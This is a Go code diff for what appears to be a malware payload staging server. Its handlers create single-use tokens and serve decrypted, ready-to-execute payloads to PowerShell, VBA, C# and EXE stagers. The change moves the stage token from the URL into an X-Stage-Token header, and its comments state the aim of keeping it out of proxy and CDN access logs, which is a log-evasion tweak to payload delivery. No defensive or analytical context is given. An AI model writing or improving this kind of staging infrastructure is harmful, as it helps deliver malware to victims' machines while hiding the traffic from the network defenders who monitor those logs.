@@ -123,11 +123,14 @@ func (h *Handlers) CreateStage(c *gin.Context) {
 	if c.Request.TLS != nil {
 		proto = "https"
 	}
-	stageURL := fmt.Sprintf("%s://%s/stage/%s", proto, c.Request.Host, token)
+	// Token travels in the X-Stage-Token header — not the URL path — to avoid
+	// appearing in proxy/CDN access logs.
+	stageEndpoint := fmt.Sprintf("%s://%s/stage/payload", proto, c.Request.Host)
 
 	h.APIResponse(c, true, "Stage created", map[string]interface{}{
-		"token":       token,
-		"stage_url":   stageURL,
+		"token":          token,
+		"stage_endpoint": stageEndpoint,
+		"stage_header":   "X-Stage-Token: " + token,
 		"format":      req.Format,
 		"arch":        req.Arch,
 		"os":          req.OSTarget,
@@ -213,12 +216,11 @@ func stageDecrypt(encKey string, data []byte) ([]byte, error) {
 }
 
 // ServeStage decrypts and delivers the payload to the stager.
-// GET /stage/:token  (public — token IS the access credential)
-// The server decrypts the payload before serving so that all stager
-// formats (PS1, VBA, CS, compiled EXE) receive ready-to-execute bytes.
+// GET /stage/payload  — token is in X-Stage-Token header (not URL path)
+// Keeping the token out of the URL prevents it from appearing in proxy/CDN logs.
 // Stage is single-use: burned after first successful fetch.
 func (h *Handlers) ServeStage(c *gin.Context) {
-	token := c.Param("token")
+	token := c.GetHeader("X-Stage-Token")
 	if token == "" {
 		c.Status(http.StatusNotFound)
 		return
